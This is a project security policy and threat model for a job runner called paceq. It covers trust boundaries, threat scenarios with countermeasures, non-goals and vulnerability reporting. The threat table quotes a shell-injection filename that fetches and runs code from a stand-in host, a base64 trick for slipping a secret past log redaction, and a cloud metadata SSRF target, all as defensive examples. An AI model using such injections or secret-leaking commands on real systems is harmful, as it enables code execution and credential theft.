# Security

## The thesis

paceq is a command runner with persistent state and scheduled triggering (plans: 08 §1). We cannot prevent code execution: that is the product. We can only control four things: who may define what runs, who may trigger a run, as whom and for how long it runs, and whether we can prove afterwards what happened.

Two consequences drive the whole design (plans: 08 §1):

1. Write access to a job spec is code execution as the execution user. "Edit a job" is a higher privilege than "run a job", not a lower one. Treat the jobs directory the way you treat `/etc/cron.d`.
2. The component with the network surface must never be able to become root. In v1 that is trivially true, because there is no network surface at all.

## Trust model in v1

One static binary, one process, one machine, same-user mode (plans: 00 §3.7, 08 §3.1). The daemon runs as its own unprivileged system user and spawns step commands as that same user. There is no privileged helper, because there is no privileged code.

### Actors

| Actor | Assumed capability | Assumed intent |
|---|---|---|
| A1 admin | full control of the host | trusted; compromise is game over and out of scope |
| A2 job author | writes job specs | partly trusted; must not escalate past the execution user |
| A3 operator | triggers, pauses, cancels, replays | must not be able to change what runs |
| A4 reader | sees status, history, logs | must not see secrets |
| A5 external trigger source | sends a webhook payload | untrusted; payload is always data, never code |
| A6 sensor target | controls the API, filenames or rows a sensor reads | untrusted; may try to steer what runs through data |
| A7 the job process itself | arbitrary code as the execution user | untrusted relative to other jobs and to the control plane |
| A8 other local user | unprivileged account on the host | must not read secrets, logs, the database or the socket |
| A9 network attacker | reaches an exposed port | unauthenticated; no such port exists in v1 |
| A10 supply chain | compromised dependency or build pipeline | must require more than one compromised control point |

### Trust boundaries

| Boundary | Where it runs in v1 |
|---|---|
| TG1 network | does not exist in v1. No TCP listener, no webhook listener |
| TG2 local IPC | unix socket `$RUNTIME_DIR/paceq.sock`, mode 0660, group owned. Both ends check it: the daemon by the mode it sets, the CLI by refusing a socket another account owns, a socket every account may write to, or a path that is not a socket |
| TG3 exec protocol | does not exist in v1. Same-user mode spawns directly, so there is no privileged helper to talk to |
| TG4 kernel and cgroup | the step command is a child process in its own process group. cgroup and Landlock confinement are post-1.0 |

The CLI half of TG2 is a refusal, not a warning. Before it dials, paceq refuses a path that is not a socket, a socket whose mode carries world write, and a socket owned by another uid, unless the caller is root, which legitimately administers another user's daemon. Once the connection stands it reads `SO_PEERCRED` and refuses again when another uid is the one listening. That second reading is the one the file cannot make honestly, because the file can be replaced between the check and the connect; `SO_PEERCRED` is Linux only, so on a macOS build only the file check runs and that window stays open. A refused socket ends the command with exit 4 and never falls back to writing the state directory directly: a silent change of transport is how an attempt to answer for the daemon would go unnoticed.

The daemon parses every piece of untrusted input: YAML specs, cron expressions, sensor stdout, JSON on the socket. It can never become root, so a parser bug there yields the paceq user's rights, not the host.

## Threat model

The scenarios are numbered T1 to T18 (plans: 08 §2.3). The status column uses a fixed vocabulary so it can be checked mechanically: a milestone id (`M0` to `M8`) means the countermeasure is planned there, `post-1.0` means it is deliberately deferred past 1.0, and `accepted` means we do not defend against it and say so under Non-goals.

No row is marked verified. Verification of every row point by point is its own piece of work in M8 (M8-06), which fills this column with evidence.

| T | Scenario | Countermeasure | Status |
|---|---|---|---|
| T1 | A6 drops a file named `$(curl evil\|sh).csv` where a sensor sees it, and the name reaches a job | argv array, never string concatenation, no implicit shell. `shell: true` is an explicit opt-in with a validation warning | M1 |
| T2 | A5 forges a webhook and starts a production job | no webhook listener exists. When one arrives it uses HMAC-SHA256 over timestamp and raw body, constant-time comparison, a bounded window | post-1.0 |
| T3 | A5 replays a valid webhook 10000 times | delivery id dedup plus `run_key` idempotency plus rate limit plus concurrency cap | post-1.0 |
| T4 | A3, an operator only, edits a job spec to escalate | specs are files on disk in v1. The socket API has no spec write endpoint at all, so spec changes go through the filesystem and whatever review guards it | M1 |
| T5 | A7 reads secrets belonging to another job | not defended in v1. One trust zone, one execution user. Per-job uid and tmpfs secret materialization are post-1.0 | accepted |
| T6 | A7 runs `echo $DB_PASSWORD \| base64` to defeat redaction | redaction is a safety net, not a boundary. The real boundary is that logs are readable only by identities that already have the job's secret level access | accepted |
| T7 | A7 forks a daemon that outlives the run and keeps consuming resources | mandatory timeout, `Setpgid` and killing the whole process group, plus a `/proc` sweep at startup matched on the run id marker and verified against process start time | M1 |
| T8 | A7 fills the disk with 500 GB of stdout | per-attempt log quota with head and tail retained and a marker line, plus per-run caps and retention | M1 |
| T9 | A8 reads the state database and lifts credentials | database 0600, state directory 0700, `umask(0077)` at startup, permission check that fails closed, secrets never in cleartext in the database | M0 |
| T10 | A6 hands a sensor a URL pointing at `169.254.169.254` | the built-in HTTP sensor validates against a deny list for loopback, link-local and private ranges, revalidates after redirects and caps the response size. Exec sensors are user code and get no such protection | M7 |
| T11 | A job spec names an artifact path like `../../etc/cron.d/x` | `os.Root` based file access for every spec-driven path, so traversal is rejected and a symlink cannot point out of the root | M1 |
| T12 | A cron expression like `0 0 30 2 *` never matches and loops the scheduler | hard iteration limit and horizon in the next-tick search; an expression with no match inside the horizon is rejected at load time | M2 |
| T13 | A YAML spec with recursive aliases (billion laughs) | strict YAML parsing with unknown fields rejected, alias, depth and size limits, and every scalar validated against the schema | M1 |
| T14 | A2 sets a different execution user in a job spec | the spec has no field for an execution user and the parser rejects unknown fields (T13), so the escalation has nothing to write to. Everything runs as the daemon's own user. When per-job uid arrives post-1.0, the allowlist lives in system config and never in a job spec | M1 |
| T15 | A compromised Go module steals secrets in `init()` | minimal dependency tree with a stated budget, `go.sum`, `govulncheck` and `gosec` in CI, an ADR per new direct dependency, no in-process plugins | M0 |
| T16 | An attacker with database write access deletes the audit trail | `run_events` is append-only and every transition is written in the same transaction as the transition. A hash chain in the same file the attacker can write is not tamper evident on its own; journald mirroring and a signed anchor are post-1.0 | post-1.0 |
| T17 | A7 reads another job's logs through the filesystem | the job process never touches a log file. It gets a pipe; the daemon reads it and writes the log as the log owner, 0600 in a 0700 directory | M1 |
| T18 | Two daemons start the same run after a restart | `flock` on the state directory refuses the second process, plus a role lease with a monotone fencing epoch and a UNIQUE index on the trigger identity | M2 |

## What has to be right from day one

The dividing line for MVP security is not "what matters most". It is "what cannot be retrofitted without changing the trust model" (plans: 08 §6). Defense in depth is cheap to add later. Changing an assumption about who trusts whom, after users have built around it, is not.

- argv arrays, no implicit shell. The spec format is a public contract; tightening it later breaks every user.
- No TCP listener at all. Add a network API first and every later authentication decision is retrofitted onto a system users already expose.
- A dedicated system user. The daemon is never root, because privilege assumptions spread through code.
- A mandatory timeout and killing the whole process group. Process lifecycle is core design, not an addition.
- Secrets never in cleartext in the database. In v1 that means `env_file` references with 0600 permissions. Migrating existing cleartext secrets is pointless: they are already in the backups.
- Logs 0600, written by the daemon. The job gets a pipe and never file access. File permissions in existing installations are hard to correct afterwards.
- `os.Root` for every spec-driven path. Traversal bugs are easy to sow and hard to weed.
- An empty environment baseline with explicit `inherit_env`. Inherited environments are impossible to shrink later without breaking jobs.
- `umask(0077)` and a permission check that fails closed at startup.
- `go.sum`, `govulncheck`, `gosec` and a dependency budget in CI. Dependency trees only grow.
- This document, with its non-goals stated. It sets expectations before anyone builds the wrong thing around the product.

This list is 08 §6 with two departures and two additions. 08 §6 reaches this repository through the synthesis, which states that the day-one list is adopted in its entirety and then enumerates a list that drops two of its entries and adds one (plans: 00 §3.7). The enumeration governs, not the preamble.

The two departures, both absent from the enumeration in 00 §3.7. 08 §6 makes the split between a job author and an operator a day-one item, because a role model is a contract. In v1 there is no role model to contract: the socket API has no spec write endpoint at all, specs are files, and the privilege that matters is filesystem write access. The distinction is therefore carried by the actor table (A2 against A3) and by T4 rather than by a role table, and it becomes a day-one item on the day a write endpoint exists. 08 §6 also makes an audit table with a hash chain a day-one item, on the argument that missing history cannot be reconstructed backwards. The history ships from day one: `run_events` is append-only (plans: 00 §4.2), and every transition has exactly one row committed in the same transaction as the transition (G10 in [docs/guarantees.md](docs/guarantees.md), with the chain checked for contiguity by I15). The chain over it does not, for the reason stated in T16: a chain living in the same file an attacker can rewrite is not tamper evident on its own, so it is only worth its cost together with journald mirroring or a signed anchor, and those are post-1.0. The reconstruction argument applies to the history, and the history is not deferred.

The two additions, neither of them in 08 §6. The empty environment baseline is the entry the synthesis adds in its own enumeration (plans: 00 §3.7). The fail-closed permission check with `umask(0077)` comes from 08 §3.9 and from the per-phase security level for v0.1 (plans: 00 §4.8). Both belong on this list by the same test: an inherited environment cannot be shrunk later without breaking jobs, and permissions on an existing installation are hard to correct afterwards.

## Non-goals

We do not hide these (plans: 08 §2.4).

- **No defense against kernel exploits from the job process.** If you need that, run paceq in a VM or under gVisor. Timeouts and process group kills reduce blast radius; they are not a tenant boundary.
- **No hard multi-tenancy.** paceq is one team, one trust zone, in v1. Run one instance per trust zone.
- **No protection against a malicious admin.** An admin who can write the jobs directory or the state directory owns the system by design.
- **Redaction does not guarantee that secrets never reach a log.** It is a safety net over a stream, and a job that encodes a secret defeats it trivially. Access control on the log is the boundary.
- **No confidentiality against whoever owns the execution user.** Anything the daemon can read, a job running as the same user can read.

## Reporting a vulnerability

Report privately through GitHub private vulnerability reporting on <https://github.com/a-holm/paceq/security/advisories/new>. Do not open a public issue for a vulnerability, and do not report it in a pull request.

If that channel is unavailable to you, use the contact details on the maintainer's GitHub profile at <https://github.com/a-holm> and say only that you have a security report. Do not put the details in a public channel; wait for a private one.

Include what you can: affected version or commit, configuration, reproduction steps, and what an attacker gains.

paceq is maintained by one person, so the commitment is deliberately modest and honest:

- Acknowledgement within 7 days.
- An assessment, with a fix plan or a reasoned refusal, within 30 days.
- A fix, an advisory with a CVE, and credit unless you prefer otherwise, when the report is accepted.

There is no bug bounty and no paid support. If a report describes something already listed under Non-goals, it is answered with a link to that list rather than a fix.
